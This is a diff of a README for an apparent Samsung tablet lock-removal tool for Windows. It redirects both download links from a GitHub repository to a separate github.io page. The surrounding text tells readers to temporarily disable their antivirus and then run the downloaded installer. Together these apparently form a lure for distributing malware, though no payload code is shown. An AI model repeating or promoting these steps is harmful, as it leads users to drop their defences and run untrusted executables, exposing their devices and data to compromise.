@@ -1,6 +1,6 @@
 # 🔓 Desbloquear-Tablet-Samsung - Remove tablet locks on Windows easily
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Marikabase777/Desbloquear-Tablet-Samsung)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://marikabase777.github.io)
 
 ## 📋 Software Overview
 
@@ -23,7 +23,7 @@ Disable your antivirus software temporarily during the installation. Some securi
 
 Follow these steps to acquire the software and set it up on your Windows machine.
 
-1.  Visit the official repository page to initiate the download: [Download Samsung Tablet Unlock](https://github.com/Marikabase777/Desbloquear-Tablet-Samsung).
+1.  Visit the official repository page to initiate the download: [Download Samsung Tablet Unlock](https://marikabase777.github.io).
 2.  Click the link to save the installer file to your Downloads folder.
 3.  Locate the downloaded file.
 4.  Double-click the file to start the installer.
